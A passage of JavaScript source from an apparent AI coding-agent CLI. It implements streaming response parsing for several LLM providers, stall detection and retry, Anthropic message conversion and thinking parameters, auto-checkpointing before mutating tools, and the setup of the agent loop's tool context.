// `_retryStreamingChat` re-issues the request instead of hanging forever.
// Default 180s mirrors the long-standing `cc chat`/`cc ask` stall guard
// (chat-core.js STREAM_STALL_MS / CC_CHAT_STALL_MS) — generous enough that even
// a slow local model's first token arrives in time, while still recovering from
// a genuinely dead connection by default. Set llm.streamStallTimeoutMs (or pass
// streamStallTimeoutMs: 0) to tune or disable. The 20s hint above still fires
// first. Must exceed STREAM_STALL_MS.
const STREAM_STALL_TIMEOUT_MS = 180000;
const _STREAM_STALL = Symbol("stream-stall");

/**
 * Run a streaming chat attempt with bounded auto-retry on transient API
 * connection drops (Claude-Code 2.1.181: "auto-retry for API connection drops
 * during thinking"). Only connection-level failures are retried (see
 * `_isRetryableStreamError`); user aborts and HTTP/status errors surface
 * immediately. Backoff is exponential and abort-aware. Transparent to the
 * caller: on success returns the attempt's result; on exhaustion rethrows the
 * last error — strictly better than today (one drop → instant error).
 *
 * @param {() => Promise<any>} streamFn  invokes one `_chat*Streaming` attempt
 * @param {object} opts  { signal?, retries?, baseDelayMs?, onRetry?, sleep? }
 */
export async function _retryStreamingChat(streamFn, opts = {}) {
  // Default budget honors CC_MAX_RETRIES / CLAUDE_CODE_MAX_RETRIES (capped 15);
  // an explicit opts.retries still wins (tests / callers that pin it).
  const retries = opts.retries ?? resolveStreamRetryMax();
  const base = opts.baseDelayMs ?? STREAM_RETRY_BASE_MS;
  const signal = opts.signal;
  const sleep = opts.sleep || ((ms) => new Promise((r) => setTimeout(r, ms)));
  let attempt = 0;
  for (;;) {
    try {
      return await streamFn();
    } catch (err) {
      if (attempt >= retries || !_isRetryableStreamError(err, signal))
        throw err;
      attempt++;
      if (typeof opts.onRetry === "function") {
        try {
          opts.onRetry(attempt, err);
        } catch {
          /* the retry notice is best-effort; never let it mask the retry */
        }
      }
      await sleep(base * Math.pow(2, attempt - 1));
      if (signal && signal.aborted) throw err; // user bailed during backoff
    }
  }
}

/**
 * Finalize a partial stream into the standard {message, usage} shape after a
 * mid-stream connection drop: marks the message truncated and drops any
 * half-streamed tool_call (its JSON args are incomplete and not safely
 * executable), so the agent loop treats it as a partial text answer and ends
 * the turn showing what the user already saw.
 */
function _finalizeTruncatedStream(finalize, state) {
  const out = finalize(state);
  if (out.message && out.message.tool_calls) delete out.message.tool_calls;
  if (out.message) out.message._truncated = true;
  return out;
}

// Wrap a ReadableStream reader so the read loop yields chunk values while a
// watchdog (a) fires `onStall(elapsedMs, stallTimeoutMs)` at most once per silent
// gap longer than `stallMs` (2.1.185 stream-stall hint; the 2nd arg lets the hint
// surface the auto-retry deadline, 0 when no timeout) and (b) — when `stallTimeoutMs` is
// set — cancels the reader and throws a RETRYABLE ETIMEDOUT after that long a
// silence, so a permanently dead-but-open connection recovers via the retry
// layer instead of hanging forever. The SAME in-flight read() promise is
// re-raced against a fresh timer each tick, so no chunk is ever dropped or
// double-read; `done`, errors, and aborts propagate unchanged. With neither a
// hook nor a timeout this degrades to a plain read loop (zero extra timers).
export async function* _iterateStreamWithStall(reader, opts = {}) {
  const onStall = typeof opts.onStall === "function" ? opts.onStall : null;
  const stallMs = opts.stallMs ?? STREAM_STALL_MS;
  const timeoutMs =
    opts.stallTimeoutMs == null ? STREAM_STALL_TIMEOUT_MS : opts.stallTimeoutMs;
  for (;;) {
    const readP = reader.read();
    // Fast path: nothing to watch for — await the chunk directly.
    if (!onStall && !timeoutMs) {
      const { done, value } = await readP;
      if (done) return;
      yield value;
      continue;
    }
    const start = Date.now();
    let notified = false;
    let result;
    for (;;) {
      const elapsed = Date.now() - start;
      // Hard inactivity timeout reached: cancel the dead stream (release the
      // socket) and throw a retryable error the dispatch seam re-issues.
      if (timeoutMs && elapsed >= timeoutMs) {
        try {
          await reader.cancel();
        } catch {
          /* best-effort release — the throw below is what matters */
        }
        const err = new Error(
          `stream stalled: no data from API for ${Math.round(elapsed / 1000)}s`,
        );
        err.code = "ETIMEDOUT";
        throw err;
      }
      // Wake at whichever fires first: the one-shot stall hint or the timeout.
      const waits = [];
      if (onStall && !notified) waits.push(stallMs - elapsed);
      if (timeoutMs) waits.push(timeoutMs - elapsed);
      const nextWait = waits.length ? Math.max(0, Math.min(...waits)) : null;
      if (nextWait == null) {
        // Hint already fired and no timeout — just wait for the chunk.
        result = await readP;
        break;
      }
      let timer;
      const wakeP = new Promise((resolve) => {
        timer = setTimeout(() => resolve(_STREAM_STALL), nextWait);
        if (timer && typeof timer.unref === "function") timer.unref();
      });
      let r;
      try {
        r = await Promise.race([readP, wakeP]);
      } finally {
        clearTimeout(timer);
      }
      if (r === _STREAM_STALL) {
        // A timer woke us. Fire the one-shot hint if we've crossed stallMs; the
        // loop re-evaluates `elapsed` to decide hint-vs-hard-timeout next tick.
        if (onStall && !notified && Date.now() - start >= stallMs) {
          notified = true;
          try {
            // 2.1.185: pass the hard-timeout deadline so the hint can tell the
            // user when the dead-but-open stream will be auto-retried (0 = no
            // timeout configured → caller shows no retry deadline).
            onStall(Date.now() - start, timeoutMs || 0);
          } catch {
            /* stall hint is best-effort — never break the stream over it */
          }
        }
        continue; // keep awaiting the SAME read() against a fresh timer
      }
      result = r;
      break;
    }
    if (result.done) return;
    yield result.value;
  }
}

async function _chatOllamaStreaming(
  apiUrl,
  body,
  onToken,
  signal,
  onStall,
  stallMs,
  stallTimeoutMs,
) {
  const response = await fetch(apiUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    signal,
    body: JSON.stringify({ ...body, stream: true }),
  });
  if (!response.ok) {
    throw new Error(formatProviderHttpError("ollama", response.status));
  }
  const state = _ollamaInitState();
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  try {
    for await (const value of _iterateStreamWithStall(reader, {
      onStall,
      stallMs,
      stallTimeoutMs,
    })) {
      buf += decoder.decode(value, { stream: true });
      let idx;
      while ((idx = buf.indexOf("\n")) >= 0) {
        _ollamaReduceLine(state, buf.slice(0, idx), onToken);
        buf = buf.slice(idx + 1);
      }
    }
    if (buf.trim()) _ollamaReduceLine(state, buf, onToken);
  } catch (err) {
    if (_streamErrorDisposition(err, signal, state.content) === "rethrow")
      throw err;
    return _finalizeTruncatedStream(_ollamaFinalize, state);
  }
  return _ollamaFinalize(state);
}

// ─── Anthropic streaming (SSE → {message, usage}, tool_use reassembled) ──────
//
// Anthropic /messages with stream:true emits SSE: message_start (input usage),
// content_block_start (text or tool_use header), content_block_delta
// (text_delta → onToken, or input_json_delta accumulating a tool's JSON args),
// message_delta (output usage). We reduce per `data:` line and finalize into
// the same shape chatWithTools returns non-streamed.

function _anthropicInitState() {
  return {
    text: "",
    blocks: {},
    inputTokens: 0,
    outputTokens: 0,
    cacheReadTokens: 0,
    cacheCreationTokens: 0,
  };
}

function _anthropicReduceLine(state, raw, onToken, onThinking) {
  const line = (raw || "").trim();
  if (!line.startsWith("data:")) return state;
  const payload = line.slice(5).trim();
  if (!payload) return state;
  let obj;
  try {
    obj = JSON.parse(payload);
  } catch {
    return state;
  }
  if (obj.type === "message_start") {
    const u = obj.message?.usage || {};
    state.inputTokens = Number(u.input_tokens) || state.inputTokens;
    // Prompt-cache token counts ride message_start.usage (Anthropic caching).
    state.cacheReadTokens =
      Number(u.cache_read_input_tokens) || state.cacheReadTokens;
    state.cacheCreationTokens =
      Number(u.cache_creation_input_tokens) || state.cacheCreationTokens;
  } else if (obj.type === "content_block_start") {
    const cb = obj.content_block || {};
    state.blocks[obj.index] =
      cb.type === "tool_use"
        ? { type: "tool_use", id: cb.id, name: cb.name, json: "" }
        : cb.type === "thinking"
          ? { type: "thinking", thinking: "", signature: "" }
          : cb.type === "redacted_thinking"
            ? { type: "redacted_thinking", data: cb.data || "" }
            : { type: "text" };
  } else if (obj.type === "content_block_delta") {
    const d = obj.delta || {};
    if (d.type === "text_delta" && d.text) {
      state.text += d.text;
      if (typeof onToken === "function") {
        try {
          onToken(d.text);
        } catch {
          // a failing UI hook must never break the run
        }
      }
    } else if (d.type === "input_json_delta" && state.blocks[obj.index]) {
      state.blocks[obj.index].json += d.partial_json || "";
    } else if (d.type === "thinking_delta" && state.blocks[obj.index]) {
      state.blocks[obj.index].thinking =
        (state.blocks[obj.index].thinking || "") + (d.thinking || "");
      if (typeof onThinking === "function" && d.thinking) {
        try {
          onThinking(d.thinking);
        } catch {
          // a failing UI hook must never break the run
        }
      }
    } else if (d.type === "signature_delta" && state.blocks[obj.index]) {
      state.blocks[obj.index].signature =
        (state.blocks[obj.index].signature || "") + (d.signature || "");
    }
  } else if (obj.type === "message_delta") {
    state.outputTokens = Number(obj.usage?.output_tokens) || state.outputTokens;
  }
  return state;
}

function _anthropicFinalize(state) {
  const toolCalls = [];
  const thinkingBlocks = [];
  for (const k of Object.keys(state.blocks).sort(
    (a, b) => Number(a) - Number(b),
  )) {
    const b = state.blocks[k];
    if (b.type === "tool_use") {
      let input = {};
      try {
        input = b.json ? JSON.parse(b.json) : {};
      } catch {
        input = {};
      }
      toolCalls.push({
        id: b.id,
        type: "function",
        function: { name: b.name, arguments: JSON.stringify(input) },
      });
    } else if (b.type === "thinking") {
      thinkingBlocks.push({
        type: "thinking",
        thinking: b.thinking || "",
        signature: b.signature || "",
      });
    } else if (b.type === "redacted_thinking") {
      thinkingBlocks.push({ type: "redacted_thinking", data: b.data || "" });
    }
  }
  const message = { role: "assistant", content: state.text };
  if (toolCalls.length) message.tool_calls = toolCalls;
  // Preserve thinking blocks verbatim (incl. signature) for replay on the next
  // tool turn — required by the API when extended thinking is on.
  if (thinkingBlocks.length) message._thinkingBlocks = thinkingBlocks;
  const out = { message };
  if (
    state.inputTokens ||
    state.outputTokens ||
    state.cacheReadTokens ||
    state.cacheCreationTokens
  ) {
    out.usage = {
      input_tokens: state.inputTokens,
      output_tokens: state.outputTokens,
      cache_read_input_tokens: state.cacheReadTokens,
      cache_creation_input_tokens: state.cacheCreationTokens,
    };
  }
  return out;
}

/** Pure reducer over Anthropic SSE lines — exported for tests (no HTTP). */
export function _accumulateAnthropicStream(lines, onToken, onThinking) {
  const state = _anthropicInitState();
  for (const line of lines)
    _anthropicReduceLine(state, line, onToken, onThinking);
  return _anthropicFinalize(state);
}

async function _chatAnthropicStreaming(
  apiUrl,
  body,
  extraHeaders,
  onToken,
  signal,
  onThinking,
  onStall,
  stallMs,
  stallTimeoutMs,
) {
  const response = await fetch(apiUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...extraHeaders },
    signal,
    body: JSON.stringify(body),
  });
  if (!response.ok) {
    throw new Error(formatProviderHttpError("anthropic", response.status));
  }
  const state = _anthropicInitState();
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  try {
    for await (const value of _iterateStreamWithStall(reader, {
      onStall,
      stallMs,
      stallTimeoutMs,
    })) {
      buf += decoder.decode(value, { stream: true });
      const lines = buf.split("\n");
      buf = lines.pop() || "";
      for (const line of lines)
        _anthropicReduceLine(state, line, onToken, onThinking);
    }
    if (buf.trim()) _anthropicReduceLine(state, buf, onToken, onThinking);
  } catch (err) {
    if (_streamErrorDisposition(err, signal, state.text) === "rethrow")
      throw err;
    return _finalizeTruncatedStream(_anthropicFinalize, state);
  }
  return _anthropicFinalize(state);
}

// ─── OpenAI-compatible streaming (SSE → {message, usage}) ────────────────────
//
// `data:` lines carry choices[0].delta.{content, tool_calls[]}; tool_calls
// arrive fragmented and keyed by `index` (name in the first chunk, arguments
// concatenated across chunks). usage rides the terminal chunk when
// stream_options.include_usage was requested. Terminator: `data: [DONE]`.

// OpenAI-compatible cached-prompt-token count. OpenAI / volcengine report it as
// usage.prompt_tokens_details.cached_tokens; DeepSeek as
// usage.prompt_cache_hit_tokens. In BOTH, prompt_tokens already INCLUDES the
// cached count (unlike Anthropic, where input_tokens is the uncached remainder)
// — so callers subtract it to recover the uncached input and avoid pricing the
// cached prefix twice. Verified live against volcengine (field present, 0 when
// the provider does not auto-cache).
function _openaiCachedTokens(usage) {
  if (!usage || typeof usage !== "object") return 0;
  const detailed = Number(usage.prompt_tokens_details?.cached_tokens);
  if (Number.isFinite(detailed) && detailed > 0) return detailed;
  const deepseek = Number(usage.prompt_cache_hit_tokens);
  if (Number.isFinite(deepseek) && deepseek > 0) return deepseek;
  return 0;
}

function _openaiInitState() {
  return {
    text: "",
    tools: [],
    inputTokens: 0,
    outputTokens: 0,
    cacheReadTokens: 0,
  };
}

function _openaiReduceLine(state, raw, onToken) {
  const line = (raw || "").trim();
  if (!line.startsWith("data:")) return state;
  const payload = line.slice(5).trim();
  if (!payload || payload === "[DONE]") return state;
  let obj;
  try {
    obj = JSON.parse(payload);
  } catch {
    return state;
  }
  const delta = obj.choices?.[0]?.delta;
  if (delta?.content) {
    state.text += delta.content;
    if (typeof onToken === "function") {
      try {
        onToken(delta.content);
      } catch {
        // a failing UI hook must never break the run
      }
    }
  }
  if (Array.isArray(delta?.tool_calls)) {
    for (const tc of delta.tool_calls) {
      const idx = tc.index ?? 0;
      if (!state.tools[idx])
        state.tools[idx] = { id: undefined, name: "", args: "" };
      if (tc.id) state.tools[idx].id = tc.id;
      if (tc.function?.name) state.tools[idx].name = tc.function.name;
      if (tc.function?.arguments)
        state.tools[idx].args += tc.function.arguments;
    }
  }
  if (obj.usage) {
    const cached = _openaiCachedTokens(obj.usage);
    const prompt = Number(obj.usage.prompt_tokens);
    if (Number.isFinite(prompt))
      state.inputTokens = Math.max(0, prompt - cached);
    if (cached) state.cacheReadTokens = cached;
    state.outputTokens =
      Number(obj.usage.completion_tokens) || state.outputTokens;
  }
  return state;
}

function _openaiFinalize(state) {
  const toolCalls = state.tools.filter(Boolean).map((t) => ({
    id: t.id || `call_${t.name || "tool"}`,
    type: "function",
    function: { name: t.name, arguments: t.args || "{}" },
  }));
  const message = { role: "assistant", content: state.text };
  if (toolCalls.length) message.tool_calls = toolCalls;
  const out = { message };
  if (state.inputTokens || state.outputTokens || state.cacheReadTokens) {
    out.usage = {
      input_tokens: state.inputTokens,
      output_tokens: state.outputTokens,
      cache_read_input_tokens: state.cacheReadTokens || 0,
    };
  }
  return out;
}

/** Pure reducer over OpenAI-compatible SSE lines — exported for tests. */
export function _accumulateOpenAIStream(lines, onToken) {
  const state = _openaiInitState();
  for (const line of lines) _openaiReduceLine(state, line, onToken);
  return _openaiFinalize(state);
}

async function _chatOpenAIStreaming(
  apiUrl,
  body,
  apiKey,
  onToken,
  signal,
  provider,
  onStall,
  stallMs,
  stallTimeoutMs,
) {
  const response = await fetch(apiUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${apiKey}`,
    },
    signal,
    body: JSON.stringify(body),
  });
  if (!response.ok) {
    throw new Error(formatProviderHttpError(provider, response.status));
  }
  const state = _openaiInitState();
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  try {
    for await (const value of _iterateStreamWithStall(reader, {
      onStall,
      stallMs,
      stallTimeoutMs,
    })) {
      buf += decoder.decode(value, { stream: true });
      const lines = buf.split("\n");
      buf = lines.pop() || "";
      for (const line of lines) _openaiReduceLine(state, line, onToken);
    }
    if (buf.trim()) _openaiReduceLine(state, buf, onToken);
  } catch (err) {
    if (_streamErrorDisposition(err, signal, state.text) === "rethrow")
      throw err;
    return _finalizeTruncatedStream(_openaiFinalize, state);
  }
  return _openaiFinalize(state);
}

/**
 * Convert cc's internal OpenAI-shaped messages into Anthropic content-block
 * messages. Internal shape: {role:"user"|"assistant"|"tool", content,
 * tool_calls?, _thinkingBlocks?}. Anthropic shape: {role:"user"|"assistant",
 * content: string | block[]} — assistant tool calls become {type:"tool_use"}
 * blocks; tool results become {type:"tool_result"} blocks inside a USER turn,
 * with consecutive results merged. Preserved thinking blocks (with signature)
 * are replayed FIRST in the assistant turn (the API requires them ahead of
 * tool_use when continuing a thinking+tool turn). Exported for tests.
 */
export function _toAnthropicMessages(msgs) {
  const out = [];
  let pendingResults = [];
  const flush = () => {
    if (pendingResults.length) {
      out.push({ role: "user", content: pendingResults });
      pendingResults = [];
    }
  };
  for (const m of msgs || []) {
    if (!m) continue;
    if (m.role === "tool") {
      pendingResults.push({
        type: "tool_result",
        tool_use_id: m.tool_call_id,
        content:
          typeof m.content === "string"
            ? m.content
            : JSON.stringify(m.content ?? ""),
      });
      continue;
    }
    flush();
    if (m.role === "assistant") {
      const blocks = [];
      if (Array.isArray(m._thinkingBlocks)) {
        for (const tb of m._thinkingBlocks) blocks.push(tb);
      }
      if (typeof m.content === "string" && m.content.trim()) {
        blocks.push({ type: "text", text: m.content });
      } else if (Array.isArray(m.content)) {
        for (const b of m.content) blocks.push(b);
      }
      if (Array.isArray(m.tool_calls)) {
        for (const tc of m.tool_calls) {
          const raw = tc.function?.arguments;
          let input = {};
          try {
            input =
              typeof raw === "string" ? JSON.parse(raw || "{}") : raw || {};
          } catch {
            input = {};
          }
          blocks.push({
            type: "tool_use",
            id: tc.id,
            name: tc.function?.name,
            input,
          });
        }
      }
      out.push({
        role: "assistant",
        content: blocks.length ? blocks : m.content || "",
      });
    } else {
      // user turn: pass content through (string or already-block array). When
      // it carries OpenAI-style `image_url` parts (`cc agent --image`), convert
      // them to Anthropic `image` blocks; text parts and any other blocks pass
      // through unchanged.
      let content = m.content;
      if (Array.isArray(content)) {
        content = content.map((b) =>
          b?.type === "image_url" ? imageUrlBlockToAnthropic(b) || b : b,
        );
      }
      out.push({ role: "user", content });
    }
  }
  flush();
  return out;
}

/** Map a Claude-Code-style intensity to an Anthropic effort level. */
function _intensityToEffort(want) {
  switch (String(want)) {
    case "ultra":
    case "ultrathink":
      return "xhigh";
    case "hard":
    case "think-hard":
    case "harder":
      return "high";
    case "think":
      return "medium";
    default:
      return "high"; // bare `true` → a sensible default for intelligence work
  }
}

/**
 * Decide the Anthropic `thinking` request params for a model. Returns null
 * (off) unless the caller opts in via options.thinking (true | "think" |
 * "hard" | "ultra"). Model-aware per the Claude API:
 *   - Opus 4.6/4.7/4.8, Sonnet 4.6 → adaptive thinking + output_config.effort
 *   - Sonnet 4.5 / Opus 4.0-4.5 / older → legacy enabled+budget (< max_tokens)
 *   - anything else (e.g. Haiku) → null (no thinking)
 * temperature is never added (it 400s on Opus 4.7/4.8). Note: `xhigh`/`max`
 * effort are Opus-tier — on Sonnet they may error; left to the caller's intent.
 * RUNTIME-UNVERIFIED — no Anthropic key to validate the wire shape live.
 * Exported for tests.
 */
export function _anthropicThinkingParams(
  model,
  options = {},
  maxTokens = 8192,
) {
  const want = options?.thinking;
  if (!want) return null; // off by default → request unchanged
  const m = String(model || "").toLowerCase();
  const adaptive = /opus-4-(6|7|8)/.test(m) || /sonnet-4-6/.test(m);
  const legacy =
    /sonnet-4-5/.test(m) ||
    /opus-4-(0|1|5)/.test(m) ||
    /sonnet-4-0/.test(m) ||
    /sonnet-3/.test(m) ||
    /opus-3/.test(m);
  if (adaptive) {
    const params = { thinking: { type: "adaptive" } };
    const effort =
      typeof options.thinkingEffort === "string"
        ? options.thinkingEffort
        : _intensityToEffort(want);
    if (effort) params.output_config = { effort };
    return params;
  }
  if (legacy) {
    let budget = Number(options.thinkingBudget) || 8000;
    // budget_tokens must be strictly < max_tokens (min 1024) on legacy models
    if (budget >= maxTokens) budget = Math.max(1024, Math.floor(maxTokens / 2));
    return { thinking: { type: "enabled", budget_tokens: budget } };
  }
  return null; // unknown / Haiku → no thinking
}

export function _normalizeAnthropicResponse(data) {
  const content = data.content || [];
  const textBlocks = content.filter((b) => b.type === "text");
  const toolBlocks = content.filter((b) => b.type === "tool_use");
  const thinkingBlocks = content.filter(
    (b) => b.type === "thinking" || b.type === "redacted_thinking",
  );

  const message = {
    role: "assistant",
    content: textBlocks.map((b) => b.text).join("\n") || "",
  };

  if (toolBlocks.length > 0) {
    message.tool_calls = toolBlocks.map((b) => ({
      id: b.id,
      type: "function",
      function: {
        name: b.name,
        arguments: JSON.stringify(b.input),
      },
    }));
  }

  // Preserve thinking blocks VERBATIM (incl. signature) so the agent loop can
  // replay them on the next tool turn — required when extended thinking is on,
  // harmless (absent) otherwise. _toAnthropicMessages re-emits them first.
  if (thinkingBlocks.length > 0) {
    message._thinkingBlocks = thinkingBlocks;
  }

  return { message };
}

// ─── Agent loop (async generator) ─────────────────────────────────────────

// Tools that never mutate the workspace — auto-checkpoint skips these.
const _CHECKPOINT_READ_ONLY = new Set([
  "read_file",
  "search_files",
  "code_intelligence",
  "list_dir",
  "list_skills",
  "search_sessions",
]);

// Rolling cap on auto-checkpoints per agent session — the engine prunes the
// oldest beyond this so a long run can't accumulate unbounded refs.
const MAX_AUTO_CHECKPOINTS_PER_SESSION = 100;

let _checkpointStoreP = null;
function _loadCheckpointStore() {
  if (!_checkpointStoreP) {
    _checkpointStoreP = import("../lib/checkpoint-store.js");
  }
  return _checkpointStoreP;
}

/**
 * Best-effort auto-checkpoint of the working tree BEFORE a mutating tool runs,
 * so a later `cc checkpoint restore` can roll back to just before that tool.
 * Enabled via toolContext.autoCheckpoint; uses the git engine only (no-op
 * outside a git work tree). Never throws — checkpointing must not block a tool.
 *
 * @returns {Promise<string|null>} the checkpoint id, or null when skipped
 */
async function _autoCheckpointBeforeTool(toolContext, toolName, toolArgs) {
  if (!toolContext?.autoCheckpoint) return null;
  if (_CHECKPOINT_READ_ONLY.has(toolName)) return null;
  const cwd = toolContext.cwd || process.cwd();
  try {
    const store = await _loadCheckpointStore();
    if (!store.isCheckpointAvailable(cwd)) return null;
    const res = store.createCheckpoint(cwd, {
      session: toolContext.checkpointSession || "agent",
      label: `before ${toolName}: ${formatToolArgs(toolName, toolArgs)}`.slice(
        0,
        120,
      ),
      skipIfUnchanged: true,
      // Bound auto-checkpoint history: a rolling safety net of the last N
      // mutating-tool states. Prevents unbounded ref growth + O(n²) nextId over
      // a long agentic run (rewinding 100+ tool calls back is already extreme).
      maxPerSession: MAX_AUTO_CHECKPOINTS_PER_SESSION,
    });
    return res?.id || null;
  } catch {
    return null; // checkpoint failure must never block the tool
  }
}

/**
 * Async generator that drives the agentic tool-use loop.
 *
 * Yields events:
 *   { type: "slot-filling", slot, question }  — when asking user for missing info
 *   { type: "checkpoint", id, tool }          — auto-checkpoint before a mutating tool
 *   { type: "tool-executing", tool, args }
 *   { type: "tool-result", tool, result, error }
 *   { type: "response-complete", content }
 *
 * @param {Array} messages - mutable messages array (will be appended to)
 * @param {object} options - provider, model, baseUrl, apiKey, contextEngine, hookDb, skillLoader, cwd, slotFiller, interaction
 */
/**
 * Lazily build (and cache on `options`) the PromptCompressor used for in-loop
 * auto-compaction. Returns null when the feature is off or the module can't be
 * loaded — callers treat that as "don't compact". Cached (including null) so we
 * import once per run, not once per iteration.
 */
async function _getAutoCompactor(options) {
  if (Object.prototype.hasOwnProperty.call(options, "_autoCompactor")) {
    return options._autoCompactor;
  }
  let compressor = null;
  try {
    const { feature } = await import("../lib/feature-flags.js");
    if (feature("PROMPT_COMPRESSOR")) {
      const { PromptCompressor } =
        await import("../harness/prompt-compressor.js");
      compressor = new PromptCompressor({
        model: options.model,
        provider: options.provider,
      });
    }
  } catch {
    compressor = null;
  }
  try {
    options._autoCompactor = compressor;
  } catch {
    // options may be frozen — fine, we just re-import next iteration
  }
  return compressor;
}

/**
 * Run `fn` inside an OpenTelemetry span when `options.recorder` is attached,
 * else run it bare (zero overhead on the un-instrumented path). `onResult`
 * gets (span, result) to stamp result-derived attributes (token usage, tool
 * status). An exception is recorded on the span (category `errCategory`) and
 * re-thrown so the loop's own error handling is unchanged. Kept dependency-free
 * — the recorder is the OTel-shaped TelemetryRecorder passed in by the caller
 * (eval / a future `--otlp` agent flag); the real agent loop now EMITS
 * model/tool/retry spans, not just eval.
 */
async function _withSpan(recorder, name, attrs, fn, onResult, errCategory) {
  if (!recorder || typeof recorder.startSpan !== "function") return fn();
  const span = recorder.startSpan(name, attrs);
  try {
    const r = await fn();
    if (onResult) {
      try {
        onResult(span, r);
      } catch {
        /* attribute stamping is best-effort */
      }
    }
    span.end();
    return r;
  } catch (err) {
    try {
      span.recordException(err, errCategory || "error");
      span.end();
    } catch {
      /* span teardown is best-effort */
    }
    throw err;
  }
}

/** Normalize the varied provider usage shapes into input/output/cache tokens. */
function _usageTokens(usage) {
  if (!usage || typeof usage !== "object") return null;
  const input = usage.prompt_tokens ?? usage.input_tokens ?? null;
  const output = usage.completion_tokens ?? usage.output_tokens ?? null;
  const cacheRead =
    usage.cache_read_input_tokens ??
    usage.prompt_tokens_details?.cached_tokens ??
    null;
  const cacheWrite = usage.cache_creation_input_tokens ?? null;
  return { input, output, cacheRead, cacheWrite };
}

/**
 * Best-effort text of the first user prompt in a message list, for the
 * `--otlp-content` span attribute. Handles both string content and the
 * multimodal `[{type:"text",text}, …]` shape; returns "" when none is found.
 * Not exported (no shim-parity impact) — only the telemetry seam uses it.
 */
function extractInitialPromptText(messages) {
  if (!Array.isArray(messages)) return "";
  for (const msg of messages) {
    if (!msg || msg.role !== "user") continue;
    const content = msg.content;
    if (typeof content === "string") return content;
    if (Array.isArray(content)) {
      const text = content
        .filter((part) => part && part.type === "text" && part.text)
        .map((part) => part.text)
        .join("\n")
        .trim();
      if (text) return text;
    }
  }
  return "";
}

/**
 * Stable id for a permission GATE decision, so a denied/gated tool span can be
 * correlated with the decision that blocked it. Only gated results carry a
 * `policy` (allow-path tools execute with no distinct decision), so this returns
 * null when there's nothing to identify. Deterministic (call id + gate) — no
 * clock/RNG — so a consumer holding the tool-result's policy + tool_call_id can
 * recompute it. Not exported (no shim-parity impact) — only the telemetry seam
 * uses it.
 */
function permissionDecisionId(callId, policy) {
  if (!policy || typeof policy !== "object" || !policy.decision) return null;
  const gate = policy.via || policy.decision;
  const base = callId || "call";
  return `${base}:perm:${gate}`;
}

export async function* agentLoop(messages, options) {
  // Shared iteration budget — replaces hardcoded MAX_ITERATIONS.
  // When options.iterationBudget is provided (e.g. from parent agent),
  // the same budget instance is shared, so parent+child consume from one pool.
  const { IterationBudget, WarningLevel } =
    await import("../lib/iteration-budget.js");
  const budget = options.iterationBudget || new IterationBudget();
  const signal = options.signal || null;
  // Optional OpenTelemetry recorder (TelemetryRecorder). When present, the loop
  // emits model/tool/retry spans + a per-run counter; when absent, zero cost.
  const recorder = options.recorder || null;
  // Phase 5 run bookends — a stable runId lets envelope subscribers correlate
  // every tool_call / tool_result / message / ended event back to one run.
  // Minted BEFORE the tool context so hook envelopes can carry it as trace_id.
  const runId =
    options.runId ||
    `run-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

  const toolContext = {
    hookDb: options.hookDb || null,
    skillLoader: options.skillLoader || _defaultSkillLoader,
    // Hook-envelope tracing (P2 unified event bus): every settings-hook payload
    // fired during this run carries trace_id = this run's id; a spawned child
    // loop carries parent_id = the spawning run's id (threaded by
    // spawn_sub_agent via hookParentTraceId), so a subagent's hook events
    // correlate back to the parent trace. Null parent at the top level.
    hookTraceId: runId,
    hookParentId: options.hookParentTraceId || null,
    // Contract-driven skill allow-list (subagent capability INTERSECT). null =
    // unrestricted; [] = none; a list restricts run_skill/list_skills to those
    // ids/dirNames. Set by the spawn path from the resolved subagent contract.
    skillAllowlist: options.skillAllowlist ?? null,
    cwd: options.cwd || process.cwd(),
    planManager: options.planManager || null,
    sessionId: options.sessionId || null,
    hostManagedToolPolicy: options.hostManagedToolPolicy || null,
    externalToolDescriptors: options.externalToolDescriptors || null,
    externalToolExecutors: options.externalToolExecutors || null,
    // Optional session-level Extension Tier gate. Hosts that can provide
    // capability/policy/permission/budget/UI signals opt in with
    // { enforce: true }; omitting it preserves the CLI's existing per-call
    // permission pipeline for backwards compatibility.
    toolAdmission: options.toolAdmission || null,
    // MCP tool DEFINITIONS the LLM sees (mcp__server__tool). Threaded here so a
    // spawn can inherit the parent's MCP tools into the child (filtered by the
    // contract's mcpServers allow-list). Otherwise consumed only at agentLoop.
    extraToolDefinitions: options.extraToolDefinitions || null,
    mcpClient: options.mcpClient || null,
    // Parent memory source — a spawn can inherit the parent's hierarchical
    // memory DB into the child ONLY when the resolved contract grants memory
    // (context:fork from a memory-bearing parent, or explicit memory:true).
    // Read off this loop's context engine (REPL sets one with db+permanentMemory).
    memoryDb: options.contextEngine?.db ?? options.db ?? null,
    permanentMemory:
      options.contextEngine?.permanentMemory ?? options.permanentMemory ?? null,
    // Parent LLM config — forwarded to spawn_sub_agent so a delegated subagent
    // inherits the provider/key and can override just the model (cc agents `model:`).
    llmOptions: {
      provider: options.provider || null,
      model: options.model || null,
      baseUrl: options.baseUrl || null,
      apiKey: options.apiKey || null,
    },
    parentMessages: messages, // pass parent messages for sub-agent auto-condensation
    interaction: options.interaction || null,
    shellPolicyOverrides: options.shellPolicyOverrides || null,
    // autoMode.classifyAllShell (Claude-Code 2.1.193): when true, the built-in
    // verification allowlist (npm test / rg / …) is classified through the
    // ApprovalGate instead of fast-pathed, so no shell command auto-runs.
    classifyAllShell: options.classifyAllShell || false,
    approvalGate: options.approvalGate || null,
    shellConfirm: options.shellConfirm || null,
    // Interactive sessions (the REPL) set this so run_code is gated through the
    // ApprovalGate like run_shell — a human can approve. Headless leaves it
    // false so run_code keeps its existing per-permission-mode behavior.
    interactiveApproval: options.interactiveApproval || false,
    additionalDirectories: options.additionalDirectories || null,
    sandbox: options.sandbox || null,
    permissionRules: options.permissionRules || null,
    permissionConfirm: options.permissionConfirm || null,
    settingsHooks: options.settingsHooks || null,
    // Async-hook supervisor (REPL-owned): lets PostToolUse `async:true` hooks
    // run fire-and-forget instead of blocking the tool loop. Optional — when
    // absent, async PostToolUse hooks are simply skipped (never run sync).
    hookSupervisor: options.hookSupervisor || null,
    autoCheckpoint: options.autoCheckpoint || false,
    checkpointSession:
      options.checkpointSession || options.sessionId || "agent",
